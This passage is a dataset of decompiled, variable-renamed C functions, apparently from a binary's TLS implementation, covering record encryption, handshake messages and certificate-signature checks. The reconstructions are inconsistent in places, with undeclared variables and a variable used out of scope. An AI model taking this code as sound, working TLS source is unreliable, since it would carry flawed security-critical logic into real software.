allocated_memory, computed_value, long_value, comparison_result, finished_message, 0xf, NULL, return_value, 0, 0);\nLAB_0042d483:\n    \n    comparison_result = memcmp(allocated_memory, data_buffer + min_required_length, (ulong)computed_value);\n    free(allocated_memory); \n    \n    \n    if (comparison_result == 0) {\n        \n        if (*(char *)(input_param + 0x66) == '\\0') {\n            *(undefined *)(input_param + 0x22388) = 0xff; \n        } else {\n            *output_param = 3; \n        }\n        return (ulong)(min_required_length + computed_value); \n    }\n    \n    return 0xfffffff6; \n}"}
{"Function Name": "FUN_0042d600", "Address": "0042d600", "Source Code": "undefined8 FUN_0042d600(long input_address, byte *data_buffer, int buffer_length) {\n    undefined8 return_value; \n    ushort short_value; \n    int calculated_value; \n    \n    if (buffer_length < 7) {\n        return 0xfffffff2; \n    }\n    \n    calculated_value = (uint)data_buffer[2] + ((uint)*data_buffer * 0x100 + (uint)data_buffer[1]) * 0x100;\n    \n    if (calculated_value < buffer_length - 2) {\n        \n        if (((ushort)(*(short *)(input_address + 100) - 0x303U) < 2) || \n            ((ushort)(*(short *)(input_address + 100) + 0x104U) < 2)) {\n            \n            if (data_buffer[4] != 1) {\n                return 0xfffffff1; \n            }\n            \n            short_value = *(ushort *)(data_buffer + 5) >> 8 | *(ushort *)(data_buffer + 5) << 8;\n            \n            if (calculated_value - 4 < (int)(uint)short_value) goto LAB_0042d738; \n            \n            calculated_value = FUN_00428630(input_address, data_buffer[3], data_buffer + 7, short_value, \n                                  *(undefined8 *)(input_address + 0x223e0), \n                                  *(undefined4 *)(input_address + 0x223e8));\n        } else {\n            \n            short_value = *(ushort *)(data_buffer + 3) >> 8 | *(ushort *)(data_buffer + 3) << 8;\n            \n            if (calculated_value - 2 < (int)(uint)short_value) goto LAB_0042d738; \n            \n            calculated_value = FUN_00428630(input_address, 1, data_buffer + 5, short_value, \n                                  *(undefined8 *)(input_address + 0x223e0), \n                                  *(undefined4 *)(input_address + 0x223e8));\n        }\n        \n        if (*(void **)(input_address + 0x223e0) != (void *)0x0) {\n            \n            free(*(void **)(input_address + 0x223e0));\n            *(undefined8 *)(input_address + 0x223e0) = 0; \n            *(undefined4 *)(input_address + 0x223e8) = 0; \n        }\n        \n        *(undefined *)(input_address + 0x223ec) = (calculated_value == 1) ? 1 : 0;\n        return (calculated_value == 1) ? 1 : 0; \n    } else {\n    LAB_0042d738:\n        return 0xfffffff2; \n    }\n}"}
{"Function Name": "FUN_0042d8f0", "Address": "0042d8f0", "Source Code": "void FUN_0042d8f0(char **param_1)\n{\n    char *firstElementPointer; \n    char *fourthElementPointer; \n    uint unsignedIntVar6; \n    uint unsignedIntVar19; \n    uint unsignedIntVar12; \n    uint unsignedIntVar13; \n    uint unsignedIntVar15; \n    int intVar16; \n    long longVar20; \n    ulong unsignedLongVarN; \n    ushort localUShortVar90; \n    int localIntVar7C; \n    undefined8 localUndefined8Var68; \n    char localCharVar60; \n    char localCharVar5F; \n    char localCharVar5E; \n    ushort localUShortVar5D; \n    undefined2 localUndefined2Var58; \n    char stackCharVar56; \n    undefined stackUndefinedVar55; \n    undefined stackUndefinedVar54; \n    undefined7 stackUndefined7Var53; \n    fourthElementPointer = param_1[3]; \n    if ((fourthElementPointer == (char *)0x0) || (fourthElementPointer[0x223c9] == '\\0')) { \n        unsignedIntVar19 = *(uint *)(param_1 + 1); \n        firstElementPointer = *param_1; \n        longVar20 = 5; \n        *(ushort *)(firstElementPointer + 3) = (short)(unsignedIntVar19 - 5) >> 8 | (short)(unsignedIntVar19 - 5) * 0x100; \n    } else {\n        firstElementPointer = *param_1; \n        longVar20 = 0xd; \n        *(ushort *)(firstElementPointer + 3) = *(ushort *)(fourthElementPointer + 0x223ca) >> 8 | *(ushort *)(fourthElementPointer + 0x223ca) << 8; \n        undefined8 uVar3 = *(undefined8 *)(fourthElementPointer + 0x22380); \n        firstElementPointer[5] = (char)((ulong)uVar3 >> 0x28); \n        (*param_1)[6] = (char)((ulong)uVar3 >> 0x20); \n        (*param_1)[7] = (char)((ulong)uVar3 >> 0x18); \n        (*param_1)[8] = (char)((ulong)uVar3 >> 0x10); \n        (*param_1)[9] = (char)((ulong)uVar3 >> 8); \n        (*param_1)[10] = (char)uVar3; \n        unsignedIntVar19 = *(uint *)(param_1 + 1); \n        firstElementPointer = *param_1; \n        unsignedIntVar12 = (short)unsignedIntVar19 - 0xd; \n        *(ushort *)(firstElementPointer + 0xb) = unsignedIntVar12 >> 8 | unsignedIntVar12 * 0x100; \n    }\n    if (fourthElementPointer == (char *)0x0) { \n        return; \n    }\n    if (*firstElementPointer == '\\x14') { \n        *(short *)(fourthElementPointer + 0x223ca) = *(short *)(fourthElementPointer + 0x223ca) + 1; \n    } else {\n        if ((*firstElementPointer == '\\x16') && (longVar20 < unsignedIntVar19)) { \n            char cVar1 = firstElementPointer[longVar20]; \n            if ((cVar1 != '\\x03') && (cVar1 != '\\0')) { \n                FUN_0042a290(fourthElementPointer, firstElementPointer + longVar20, unsignedIntVar19 - longVar20); \n                fourthElementPointer = param_1[3]; \n            }\n        }\n        if ((fourthElementPointer[0xd4] != '\\0') && (fourthElementPointer[0x22358] != '\\0')) { \n            unsignedIntVar19 = *(uint *)(param_1 + 1); \n            intVar16 = unsignedIntVar19 - longVar20; \n            if (fourthElementPointer[0x22358] == '\\x01') { \n                int iVar5 = FUN_00426920(fourthElementPointer); \n                int iVar17 = intVar16 + 0x10; \n                if (*(short *)(fourthElementPointer + 100) == 0x301) { \n                    iVar17 = intVar16; \n                }\n                unsignedIntVar15 = 0x10 - (iVar17 + iVar5 & 0xfU); \n                unsignedIntVar6 = unsignedIntVar15 & 0xff; \n                unsignedIntVar13 = iVar17 + iVar5 + unsignedIntVar6; \n                void *__ptr = malloc((ulong)unsignedIntVar13); \n                if (__ptr != (void *)0x0) { \n                    unsignedIntVar12 = unsignedIntVar13 + longVar20; \n                    fourthElementPointer = (char *)malloc((ulong)unsignedIntVar12); \n                    if (fourthElementPointer == (char *)0x0) { \n                        memset(*param_1, 0, (ulong)unsignedIntVar19); \n                    } else {\n                        unsignedLongVarN = (ulong)(longVar20 - 2); \n                        memcpy(fourthElementPointer, *param_1, unsignedLongVarN); \n                        localUShortVar90 = (ushort)unsignedIntVar13; \n                        *(ushort *)(fourthElementPointer + unsignedLongVarN) = localUShortVar90 >> 8 | localUShortVar90 << 8; \n                        if (*(short *)(param_1[3] + 100) == 0x301) { \n                            localIntVar7C = 0; \n                        } else {\n                            FUN_004283b0(__ptr, 0x10); \n                            localIntVar7C = 0x10; \n                        }\n                        memcpy((void *)(localIntVar7C + (long)__ptr), *param_1 + longVar20, (ulong)(*(int *)(param_1 + 1) - longVar20)); \n                        intVar16 = *(int *)(param_1 + 1) - longVar20; \n                        unsignedIntVar19 = localIntVar7C + intVar16; \n                        if (fourthElementPointer[0x223c9] == '\\0') { \n                            FUN_0042d750(1, fourthElementPointer, *param_1, *(int *)(param_1 + 1), 0, 0, (ulong)unsignedIntVar19 + (long)__ptr, iVar5, 0); \n                        } else {\n                            undefined2 *puVar4 = (undefined2 *)*param_1; \n                            localUndefined2Var58 = *puVar4; \n                            stackCharVar56 = *(char *)(puVar4 + 1); \n                            stackUndefinedVar55 = (undefined)*(undefined2 *)((long)puVar4 + unsignedLongVarN); \n                            stackUndefinedVar54 = (undefined)((ushort)*(undefined2 *)((long)puVar4 + unsignedLongVarN) >> 8); \n                            unsignedIntVar12 = (uint)*(undefined8 *)((long)puVar4 + 3); \n                            unsignedIntVar6 = (uint)((ulong)*(undefined8 *)((long)puVar4 + 3) >> 0x20); \n                            FUN_0042d750(1, fourthElementPointer, &localUndefined2Var58, 5, (char *)((long)puVar4 + longVar20), intVar16, (ulong)unsignedIntVar19 + (long)__ptr, iVar5, CONCAT44(unsignedIntVar12 >> 0x18 | (unsignedIntVar12 & 0xff0000) >> 8 | (unsignedIntVar12 & 0xff00) << 8 | unsignedIntVar12 << 0x18, unsignedIntVar6 >> 0x18 | (unsignedIntVar6 & 0xff0000) >> 8 | (unsignedIntVar6 & 0xff00) << 0x10 | unsignedIntVar6 << 0x18)); \n                        }\n                        memset((void *)((ulong)(unsignedIntVar19 + iVar5) + (long)__ptr), unsignedIntVar6 - 1, (ulong)(unsignedIntVar15 & 0xff)); \n                        FUN_00428130(param_1[3], __ptr, fourthElementPointer + longVar20, unsignedIntVar13); \n                        if (*param_1 != (char *)0x0) { \n                            free(*param_1); \n                        }\n                        *param_1 = fourthElementPointer; \n                        *(uint *)(param_1 + 1) = unsignedIntVar12; \n                        *(uint *)((long)param_1 + 0xc) = unsignedIntVar12; \n                    }\n                    free(__ptr); \n                    fourthElementPointer = param_1[3]; \n                    goto LAB_0042d955; \n                }\n            } else {\n                intVar16 += (cVar1 != '\\x03') ? 0x18 : 0x10; \n                size_t __size = (size_t)(int)(longVar20 + 0x1d + intVar16); \n                fourthElementPointer = (char *)malloc(__size); \n                if (fourthElementPointer != (char *)0x0) { \n                    memset(fourthElementPointer, 0, __size); \n                    firstElementPointer = param_1[3]; \n                    if (firstElementPointer[0x223c9] == '\\0') { \n                        unsignedIntVar19 = (uint)*(undefined8 *)(firstElementPointer + 0x22380); \n                        unsignedIntVar6 = (uint)((ulong)*(undefined8 *)(firstElementPointer + 0x22380) >> 0x20); \n                        localUndefined8Var68 = CONCAT44(unsignedIntVar19 >> 0x18 | (unsignedIntVar19 & 0xff0000) >> 8 | (unsignedIntVar19 & 0xff00) << 8 | unsignedIntVar19 << 0x18, unsignedIntVar6 >> 0x18 | (unsignedIntVar6 & 0xff0000) >> 8 | (unsignedIntVar6 & 0xff00) << 0x10 | unsignedIntVar6 << 0x18); \n                        pcVar10 = *param_1; \n                    } else {\n                        pcVar10 = *param_1; \n                        localUndefined8Var68 = *(undefined8 *)(pcVar10 + 3); \n                    }\n                    localCharVar60 = *pcVar10; \n                    localCharVar5F = pcVar10[1]; \n                    localCharVar5E = pcVar10[2]; \n                    localUShortVar5D = (short)(*(short *)(param_1 + 1) - (short)longVar20) >> 8 | (short)(*(short *)(param_1 + 1) - (short)longVar20) * 0x100; \n                    if (firstElementPointer[0x22358] == '\\x03') { \n                        *(undefined4 *)(firstElementPointer + 0x108) = 1; \n                        *(uint *)(firstElementPointer + 0x10c) = (uint)(byte)firstElementPointer[0x222f9] << 8 | (uint)(byte)firstElementPointer[0x222fa] << 0x10 | (uint)(byte)firstElementPointer[0x222f8] | (uint)(byte)firstElementPointer[0x222fb] << 0x18; \n                        *(uint *)(firstElementPointer + 0x110) = ((uint)(byte)firstElementPointer[0x222fd] << 8 | (uint)(byte)firstElementPointer[0x222fe] << 0x10 | (uint)(byte)firstElementPointer[0x222fc] | (uint)(byte)firstElementPointer[0x222ff] << 0x18) ^ ((uint)localUndefined8Var68._1_1_ << 8 | (uint)localUndefined8Var68._2_1_ << 0x10 | (uint)(byte)localUndefined8Var68 | (uint)localUndefined8Var68._3_1_ << 0x18); \n                        *(uint *)(firstElementPointer + 0x114) = ((uint)(byte)firstElementPointer[0x22301] << 8 | (uint)(byte)firstElementPointer[0x22302] << 0x10 | (uint)(byte)firstElementPointer[0x22300] | (uint)(byte)firstElementPointer[0x22303] << 0x18) ^ ((uint)localUndefined8Var68._5_1_ << 8 | (uint)localUndefined8Var68._6_1_ << 0x10 | (uint)localUndefined8Var68._4_1_ | (uint)localUndefined8Var68._7_1_ << 0x18); \n                        FUN_004254b0(firstElementPointer + 0xd8, &localUndefined2Var58); \n                        iVar17 = FUN_004257e0(param_1[3] + 0xd8, *param_1 + longVar20, intVar16, &localUndefined8Var68, 0xd, &localUndefined2Var58, fourthElementPointer + longVar20); \n                        iVar17 += unsignedIntVar12; \n                    } else {\n                        uVar2 = *(undefined4 *)(firstElementPointer + 0x222f8); \n                        localUndefined2Var58 = (undefined2)uVar2; \n                        stackCharVar56 = (char)((uint)uVar2 >> 0x10); \n                        stackUndefinedVar55 = (undefined)((uint)uVar2 >> 0x18); \n                        FUN_004283b0(&stackUndefinedVar54, 8); \n                        *(ulong *)(fourthElementPointer + longVar20) = CONCAT71(stackUndefined7Var53, stackUndefinedVar54); \n                        FUN_004246b0(param_1[3] + 0xd8); \n                        FUN_004234c0(param_1[3] + 0xd8, &localUndefined2Var58, 0xc); \n                        FUN_00424350(param_1[3] + 0xd8, &localUndefined8Var68, 0xd); \n                        iVar17 = intVar16 + unsignedIntVar12 + 8; \n                        FUN_004238a0(param_1[3] + 0xd8, *param_1 + longVar20, intVar16, fourthElementPointer + (int)(unsignedIntVar12 + 8), 0); \n                        local_70 = 0x10; \n                        FUN_004236b0(param_1[3] + 0xd8, fourthElementPointer + iVar17, &local_70); \n                        iVar17 += (int)local_70; \n                    }\n                    memcpy(fourthElementPointer, *param_1, (ulong)(unsignedIntVar12 - 2)); \n                    firstElementPointer = *param_1; \n                    *(ushort *)(fourthElementPointer + (unsignedIntVar12 - 2)) = (short)iVar17 - (short)longVar20 >> 8 | (short)iVar17 - (short)longVar20 * 0x100; \n                    if (firstElementPointer != (char *)0x0) { \n                        free(firstElementPointer); \n                    }\n                    *param_1 = fourthElementPointer; \n                    *(int *)(param_1 + 1) = iVar17; \n                    *(int *)((long)param_1 + 0xc) = iVar17; \n                    fourthElementPointer = param_1[3]; \n                    goto LAB_0042d955; \n                }\n            }\n        }\n    }\n    memset(*param_1, 0, (ulong)unsignedIntVar19); \n    fourthElementPointer = param_1[3]; \nLAB_0042d955:\n    *(long *)(fourthElementPointer + 0x22380) = *(long *)(fourthElementPointer + 0x22380) + 1; \n    return; \n}"}
{"Function Name": "FUN_0042df70", "Address": "0042df70", "Source Code": "void FUN_0042df70(long inputPointer)\n{\n    \n    if (inputPointer != 0 && *(char *)(inputPointer + 0x10) == '\\0') {\n        \n        checkFunction();\n    }\n}"}
{"Function Name": "FUN_0042df90", "Address": "0042df90", "Source Code": "void * FUN_0042df90(long input_param) \n{\n    void *memory_pointer; \n    undefined local_flag; \n    undefined8 local_value1; \n    undefined8 local_value2; \n    ulong local_size; \n    undefined local_buffer[4096]; \n    ulong local_array[512]; \n    undefined local_temp[4104]; \n    \n    if (*(char *)(input_param + 0x66) == '\\0') {\n        \n        memory_pointer = (void *)FUN_00428040(input_param, 0x16, *(undefined2 *)(input_param + 100), 0);\n        local_flag = 0x10; \n        FUN_00428240(memory_pointer, &local_flag, 1); \n        int return_value = FUN_0042b990(input_param); \n        \n        if ((return_value == 0) || (*(long *)(input_param + 200) == 0) || (*(int *)(input_param + 0xd0) == 0)) {\n            FUN_0042ca60(memory_pointer); \n            *(undefined *)(input_param + 0x22388) = 2; \n        } else {\n            \n            if (return_value == 1) {\n                local_value1 = 0xfff; \n                local_value2 = 0xfff; \n                local_size = 0xfff; \n                \n                if (FUN_0042bd30(local_array, &local_value1, local_temp, &local_value2, local_buffer, &local_size, *(undefined8 *)(input_param + 0x80)) != 0) {\n                    \n                    if (memory_pointer != (void *)0x0) {\n                        free(memory_pointer);\n                    }\n                    FUN_0042be90(input_param); \n                    return (void *)0x0; \n                }\n                FUN_0042be90(input_param); \n                FUN_00428380(memory_pointer, (int)local_size + 2); \n                \n                if (*(char *)(input_param + 0x223c9) != '\\0') {\n                    FUN_0042c5e0(input_param, memory_pointer, (int)local_size + 2); \n                }\n                FUN_00428330(memory_pointer, local_size & 0xffff); \n                FUN_00428240(memory_pointer, local_buffer, local_size & 0xffffffff); \n            } else if (*(long *)(input_param + 0x88) != 0) { \n                local_array[0] = 0x800; \n                \n                if (FUN_00420610(*(long *)(input_param + 0x88), local_temp, local_array) != 0) {\n                    \n                    if (memory_pointer == (void *)0x0) {\n                        return (void *)0x0; \n                    }\n                    free(memory_pointer); \n                    return (void *)0x0; \n                }\n                FUN_0042b130(input_param); \n                FUN_00428380(memory_pointer, (int)local_array[0] + 1); \n                \n                if (*(char *)(input_param + 0x223c9) != '\\0') {\n                    FUN_0042c5e0(input_param, memory_pointer, (int)local_array[0] + 1); \n                    *(char *)(input_param + 0x223d9) += 1; \n                }\n                local_buffer[0] = (undefined)local_array[0]; \n                FUN_00428240(memory_pointer, local_buffer, 1); \n                FUN_00428240(memory_pointer, local_temp, local_array[0] & 0xffffffff); \n            }\n            FUN_00429d90(input_param, 0x30); \n            *(undefined *)(input_param + 0x22388) = 2; \n        }\n        \n        if (memory_pointer != (void *)0x0) {\n            \n            if (*(char *)((long)memory_pointer + 0x10) == '\\0') {\n                FUN_0042d8f0(memory_pointer); \n            }\n            return memory_pointer; \n        }\n    }\n    return (void *)0x0; \n}"}
{"Function Name": "FUN_0042f140", "Address": "0042f140", "Source Code": "long * FUN_0042f140(long input_pointer) \n{\n    long *result_pointer; \n    ulong calculated_value; \n    int temp_value_1; \n    int temp_value_2; \n    \n    if ((input_pointer != 0) && (*(char *)(input_pointer + 0x66) != '\\0')) {\n        \n        result_pointer = (long *)FUN_00428040(input_pointer, 0x16, *(undefined2 *)(input_pointer + 100));\n        \n        if (result_pointer != (long *)0x0) {\n            undefined local_var_1 = 0xd; \n            \n            FUN_00428240(result_pointer, &local_var_1, 1);\n            undefined local_array_1[16]; \n            \n            FUN_00428240(result_pointer, local_array_1, 3);\n            \n            if (*(char *)(input_pointer + 0x223c9) != '\\0') {\n                \n                FUN_0042c5e0(input_pointer, result_pointer, 0);\n            }\n            temp_value_1 = *(int *)(result_pointer + 1); \n            undefined local_var_2 = 1; \n            \n            FUN_00428240(result_pointer, &local_var_2, 1);\n            undefined local_var_3 = 1; \n            \n            FUN_00428240(result_pointer, &local_var_3, 1);\n            \n            if ((*(short *)(input_pointer + 100) == -0x103) || (*(short *)(input_pointer + 100) == 0x303)) {\n                \n                FUN_00428330(result_pointer, 10);\n                undefined local_var_4 = 4; \n                \n                FUN_00428240(result_pointer, &local_var_4, 1);\n                undefined local_var_5 = 1; \n                \n                FUN_00428240(result_pointer, &local_var_5, 1);\n                undefined local_var_6 = 2; \n                \n                FUN_00428240(result_pointer, &local_var_6, 1);\n                undefined local_var_7 = 1; \n                \n                FUN_00428240(result_pointer, &local_var_7, 1);\n                undefined local_var_8 = 5; \n                \n                FUN_00428240(result_pointer, &local_var_8, 1);\n                undefined local_var_9 = 1; \n                \n                FUN_00428240(result_pointer, &local_var_9, 1);\n                undefined local_var_10 = 6; \n                \n                FUN_00428240(result_pointer, &local_var_10, 1);\n                undefined local_var_11 = 1; \n                \n                FUN_00428240(result_pointer, &local_var_11, 1);\n                undefined local_var_12 = 1; \n                \n                FUN_00428240(result_pointer, &local_var_12, 1);\n                undefined local_var_13 = 1; \n                \n                FUN_00428240(result_pointer, &local_var_13, 1);\n            }\n            \n            FUN_00428330(result_pointer, 0);\n            \n            if (*(char *)(result_pointer + 2) == '\\0') {\n                temp_value_1 = *(int *)(result_pointer + 1) - temp_value_1; \n                calculated_value = -(ulong)(*(char *)(input_pointer + 0x223c9) == '\\0') & 0xfffffffffffffff8; \n                temp_value_2 = temp_value_1 + 0xffff; \n                if (-1 < temp_value_1) { \n                    temp_value_2 = temp_value_1; \n                }\n                \n                *(char *)(*result_pointer + 0xe + calculated_value) = (char)((uint)temp_value_2 >> 0x10);\n                temp_value_1 = temp_value_1 % 0x10000; \n                temp_value_2 = temp_value_1 + 0xff; \n                if (-1 < temp_value_1) { \n                    temp_value_2 = temp_value_1; \n                }\n                \n                *(char *)(*result_pointer + 0xf + calculated_value) = (char)((uint)temp_value_2 >> 8);\n                \n                *(char *)(*result_pointer + 0x10 + calculated_value) = (char)temp_value_1;\n                \n                if (*(char *)(input_pointer + 0x223c9) != '\\0') {\n                    \n                    *(undefined *)(*result_pointer + 0x16) = *(undefined *)(*result_pointer + 0xe);\n                    *(undefined *)(*result_pointer + 0x17) = *(undefined *)(*result_pointer + 0xf);\n                    *(undefined *)(*result_pointer + 0x18) = *(undefined *)(*result_pointer + 0x10);\n                    \n                    *(char *)(input_pointer + 0x223d9) = *(char *)(input_pointer + 0x223d9) + '\\x01';\n                }\n                \n                if (*(char *)(result_pointer + 2) == '\\0') {\n                    \n                    FUN_0042d8f0(result_pointer);\n                }\n            }\n            return result_pointer; \n        }\n    }\n    return (long *)0x0; \n}"}
{"Function Name": "FUN_0042f3e0", "Address": "0042f3e0", "Source Code": "long FUN_0042f3e0(long input_param) \n{\n    long result_value; \n    \n    if ((*(char *)(input_param + 0x66) != '\\0') && (*(char *)(input_param + 0x223c9) != '\\0')) {\n        \n        \n        if (((*(long *)(input_param + 0x223d0) == 0) || (*(char *)(input_param + 0x223d8) == '\\0')) &&\n            (FUN_0042c680(input_param) == 0)) {\n            return 0; \n        }\n        \n        result_value = FUN_00428040(input_param, 0x16, *(undefined2 *)(input_param + 100), 0);\n        \n        \n        if (result_value != 0) {\n            undefined local_counter = 3; \n            \n            \n            FUN_00428240(result_value, &local_counter, 1);\n            \n            \n            FUN_00428380(result_value, *(byte *)(input_param + 0x223d8) + 3);\n            FUN_00428330(result_value, 0); \n            FUN_00428380(result_value, 0); \n            \n            \n            FUN_00428380(result_value, *(byte *)(input_param + 0x223d8) + 3);\n            FUN_00428330(result_value, *(undefined2 *)(input_param + 100)); \n            \n            \n            FUN_00428240(result_value, *(undefined8 *)(input_param + 0x223d0), *(undefined *)(input_param + 0x223d8));\n            \n            \n            if (*(char *)(result_value + 0x10) == '\\0') {\n                FUN_0042d8f0(result_value); \n            }\n            return result_value; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042f520", "Address": "0042f520", "Source Code": "uint FUN_0042f520(byte *input_bytes, int byte_count, uint *output_value)\n{\n    byte first_byte; \n    uint computed_result; \n    ulong loop_counter; \n    int intermediate_result; \n    int shift_value; \n    uint masked_value; \n    *output_value = 0; \n    if (0 < byte_count) { \n        first_byte = *input_bytes; \n        if (-1 < (char)first_byte) { \n            *output_value = 1; \n            return (uint)first_byte; \n        }\n        masked_value = first_byte & 0x7f; \n        *output_value = masked_value; \n        if ((int)masked_value < byte_count) { \n            ulong upper_limit = (masked_value < 5) ? (ulong)masked_value : 4; \n            if (upper_limit != 0) { \n                loop_counter = 0; \n                shift_value = 1; \n                computed_result = 0; \n                do {\n                    loop_counter++; \n                    intermediate_result = (uint)input_bytes[loop_counter] * shift_value; \n                    shift_value <<= 8; \n                    computed_result += intermediate_result; \n                } while (loop_counter < upper_limit); \n            } else {\n                computed_result = 0; \n            }\n            *output_value = masked_value + 1; \n            return computed_result; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042f5c0", "Address": "0042f5c0", "Source Code": "undefined8 FUN_0042f5c0(int *array1, int *array2)\n{\n    long offset = 0; \n    if (*array2 == 0) { \n        return 1; \n    }\n    if (*array2 == *array1) { \n        do {\n            if (*(int *)((long)array2 + offset + 4) == 0) { \n                return 1; \n            }\n            offset += 4; \n        } while (*(int *)((long)array2 + offset) == *(int *)((long)array1 + offset)); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_0042f600", "Address": "0042f600", "Source Code": "undefined4 FUN_0042f600(int input_value)\n{\n    \n    if (input_value - 4U < 0xb) {\n        \n        \n        return *(undefined4 *)(&data_array + (ulong)(input_value - 4U) * 4);\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_0042f620", "Address": "0042f620", "Source Code": "void * FUN_0042f620(undefined4 operation_type, long size_param, int count_param)\n{\n    int unused_integer; \n    void *allocated_memory; \n    undefined temp_buffer[272]; \n    \n    if (size_param != 0 && count_param != 0) {\n        \n        switch(operation_type) {\n            case 4:\n                \n                allocated_memory = malloc(0x10);\n                if (allocated_memory != (void *)0x0) { \n                    \n                    if (FUN_00413d60(temp_buffer) != 0 || FUN_00413dc0(temp_buffer, size_param, count_param) != 0) {\n                        return allocated_memory; \n                    }\n                    FUN_00413ef0(temp_buffer, allocated_memory); \n                    return allocated_memory; \n                }\n                break;\n            case 5:\n                \n                allocated_memory = malloc(0x14);\n                if (allocated_memory != (void *)0x0) { \n                    \n                    if (FUN_00412450(temp_buffer) != 0 || FUN_004124b0(temp_buffer, size_param, count_param) != 0) {\n                        return allocated_memory; \n                    }\n                    FUN_004125e0(temp_buffer, allocated_memory); \n                    return allocated_memory; \n                }\n                break;\n            case 0xb:\n            case 0xe:\n                \n                allocated_memory = malloc(0x20);\n                if (allocated_memory != (void *)0x0) { \n                    \n                    if (FUN_00412790(temp_buffer) != 0 || FUN_00412800(temp_buffer, size_param, count_param) != 0) {\n                        return allocated_memory; \n                    }\n                    FUN_00412930(temp_buffer, allocated_memory); \n                    return allocated_memory; \n                }\n                break;\n            case 0xc:\n                \n                allocated_memory = malloc(0x30);\n                if (allocated_memory != (void *)0x0) { \n                    \n                    if (FUN_00412ae0(temp_buffer) != 0 || FUN_00412c40(temp_buffer, size_param, count_param) != 0) {\n                        return allocated_memory; \n                    }\n                    FUN_00412f30(temp_buffer, allocated_memory); \n                    return allocated_memory; \n                }\n                break;\n            case 0xd:\n                \n                allocated_memory = malloc(0x40);\n                if (allocated_memory != (void *)0x0) { \n                    \n                    if (FUN_00412b90(temp_buffer) != 0 || FUN_00412c40(temp_buffer, size_param, count_param) != 0) {\n                        return allocated_memory; \n                    }\n                    FUN_00412d70(temp_buffer, allocated_memory); \n                    return allocated_memory; \n                }\n                break;\n        }\n    }\n    return (void *)0x0; \n}"}
{"Function Name": "FUN_0042f7e0", "Address": "0042f7e0", "Source Code": "undefined4 FUN_0042f7e0(long input_param_1,long input_param_2)\n{\n    uint index; \n    int result_code; \n    int function_result; \n    undefined4 function_output; \n    char *char_pointer; \n    undefined4 local_return_value; \n    undefined local_buffer [88]; \n    \n    if (((input_param_1 != 0) && (input_param_2 != 0)) && (*(long *)(input_param_1 + 200) != 0)) {\n        \n        if (*(long *)(input_param_1 + 0xd8) == 0 || *(int *)(input_param_1 + 0xd0) == 0 || \n            *(long *)(input_param_2 + 0xe0) == 0 || *(int *)(input_param_2 + 0xe8) == 0) {\n            return 0; \n        }\n        \n        if (global_flag == '\\0') {\n            FUN_00428410(); \n        }\n        index = *(int *)(input_param_1 + 4) - 4; \n        \n        if ((index < 0xb) && (function_result = *(int *)(&DAT_00438600 + (ulong)index * 4), 0 < function_result)) {\n            \n            switch((ulong)index) {\n                case 0: function_output = FUN_00414210(&DAT_00437665); break; \n                case 1: function_output = FUN_00414210(&DAT_00437669); break; \n                case 7: case 10: function_output = FUN_00414210(\"sha256\"); break; \n                case 8: function_output = FUN_00414210(\"sha384\"); break; \n                case 9: function_output = FUN_00414210(\"sha512\"); break; \n                default: goto switchD_0042f86f_caseD_2; \n            }\n            \n            if (*(int *)(input_param_1 + 4) == 0xe) {\n                \n                result_code = FUN_0041b270(*(undefined8 *)(input_param_2 + 0xe0), *(undefined4 *)(input_param_2 + 0xe8), local_buffer, 0);\n                if (result_code != 0) {\n                    return 0; \n                }\n                char_pointer = *(char **)(input_param_1 + 200); \n                local_return_value = 0; \n                result_code = *(int *)(input_param_1 + 0xd0); \n                \n                if (*char_pointer == '\\0') {\n                    char_pointer++;\n                    result_code--;\n                }\n                \n                function_result = FUN_0041d090(char_pointer, (long)result_code, *(undefined8 *)(input_param_1 + 0xd8), (long)function_result, &local_return_value, local_buffer);\n                FUN_0041b230(local_buffer); \n            } else {\n                \n                result_code = FUN_004204c0(*(undefined8 *)(input_param_2 + 0xe0), *(undefined4 *)(input_param_2 + 0xe8), local_buffer);\n                if (result_code != 0) {\n                    return 0; \n                }\n                char_pointer = *(char **)(input_param_1 + 200); \n                local_return_value = 0; \n                result_code = *(int *)(input_param_1 + 0xd0); \n                \n                if (*char_pointer == '\\0') {\n                    char_pointer++;\n                    result_code--;\n                }\n                \n                function_result = FUN_00421640(char_pointer, (long)result_code, *(undefined8 *)(input_param_1 + 0xd8), (long)function_result, 1, function_output, 0, &local_return_value, local_buffer);\n                FUN_00420450(local_buffer); \n            }\n            \n            if (function_result == 0) {\n                return local_return_value; \n            }\n        }\n    }\nswitchD_0042f86f_caseD_2:\n    return 0; \n}"}
{"Function Name": "FUN_0042fa40", "Address": "0042fa40", "Source Code": "undefined4 FUN_0042fa40(undefined8 *array, int array_length)\n{\n    int return_value; \n    long loop_counter = 0; \n    undefined4 result = 0; \n    \n    if (array == (undefined8 *)0x0 || array_length == 0 || (return_value = FUN_00427150(*array), return_value != 0)) {\n        result = 0x2a; \n    } else if (array_length > 1) { \n        do {\n            \n            return_value = FUN_00427150(array[loop_counter + 1]);\n            \n            if (return_value != 0 || (return_value = FUN_0042f7e0(array[loop_counter], array[loop_counter + 1]), return_value == 0)) {\n                result = 0x2a; \n                break; \n            }\n            loop_counter++; \n        } while (loop_counter < array_length - 1); \n    }\n    return result; \n}"}
{"Function Name": "FUN_0042fad0", "Address": "0042fad0", "Source Code": "undefined4 FUN_0042fad0(long input_param, undefined8 *data_array, int data_count) {\n    undefined8 *end_pointer; \n    uint current_index; \n    ulong outer_index; \n    \n    if (data_array == (undefined8 *)0x0 || data_count == 0 || *(long *)(input_param + 0x22400) == 0 || \n        (*(int *)(input_param + 0x22408) == 0 || data_count < 1)) {\n        return 0x2a; \n    }\n    end_pointer = data_array + data_count; \n    do {\n        outer_index = 0; \n        do {\n            \n            if (FUN_00427150(*(undefined8 *)(*(long *)(input_param + 0x22400) + outer_index * 8)) != 0) {\n                break; \n            }\n            \n            if (FUN_0042f7e0(*data_array, *(undefined8 *)(*(long *)(input_param + 0x22400) + outer_index * 8)) != 0) {\n                return 0; \n            }\n            current_index = (int)outer_index + 1; \n            outer_index = (ulong)current_index; \n        } while (current_index < *(uint *)(input_param + 0x22408)); \n        \n        data_array++; \n        if (data_array == end_pointer) { \n            return 0x2a; \n        }\n    } while (true); \n}"}
